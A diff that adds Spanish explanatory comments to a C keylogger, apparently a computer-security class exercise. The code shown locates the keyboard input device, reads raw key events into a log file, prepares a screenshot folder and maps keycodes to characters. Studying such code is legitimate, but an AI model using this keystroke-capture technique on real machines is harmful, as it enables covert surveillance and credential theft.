@@ -10,6 +10,7 @@
 #include <time.h>
 #include <sys/types.h>
 
+//define las rutas para guardar los registros del teclado y las capturas de pantalla
 #define LOGFILEPATH "/home/davidrm/Documentos/seguridad_informatica/keylogger.txt"
 #define SCREENSHOT_DIR "/home/davidrm/Documentos/seguridad_informatica/screenshots/"
 
@@ -20,8 +21,11 @@ void takeScreenshot(int screenshotNumber);
 
 int main() {
     struct input_event ev;
+    // ruta al directorio
     static char path_keyboard[20] = "/dev/input/";
+    // concatenar variable keyboard
     strcat(path_keyboard, getEvent());
+    // eliminar último caracter (breakline)
     path_keyboard[strlen(path_keyboard) - 1] = 0;
 
     // Crear directorio para capturas de pantalla
@@ -29,20 +33,21 @@ int main() {
         perror("Error creating screenshot directory");
         exit(EXIT_FAILURE);
     }
-
+    // leer ruta a input
     int device_keyboard = open(path_keyboard, O_RDONLY);
+    // imprimir error
     if (device_keyboard == -1) {
         perror("Error opening device");
         exit(EXIT_FAILURE);
     }
-
+    //creando o abriendo el archivo keylogger.txt
     FILE *fp = fopen(LOGFILEPATH, "a");
     if (fp == NULL) {
         perror("Error opening log file");
         close(device_keyboard);
         exit(EXIT_FAILURE);
     }
-
+    //inicializando las variables 
     int shift = 0;
     int altGr = 0;
     int capsLock = 0;
@@ -87,16 +92,18 @@ int main() {
 }
 
 char *getEvent() {
+    // leer el fichero devices y extraer el input que se refiera al teclado
     char *command = (char *) "cat /proc/bus/input/devices | grep -C 5 keyboard | grep -E -o 'event[0-9]'";
     static char event[8];
     FILE *pipe = popen(command, "r");
     if (!pipe)
         exit(1);
+    // obtener la cadena de texto del evento correspondiente al teclado
     fgets(event, 8, pipe);
     pclose(pipe);
     return event;
 }
-
+// en esta parte del codigo es donde se le asigna un valor a cada tecla 
 char getKeyChar(int keycode, int shift, int altGr, int capsLock) {
     char key = '\0';
     switch (keycode) {
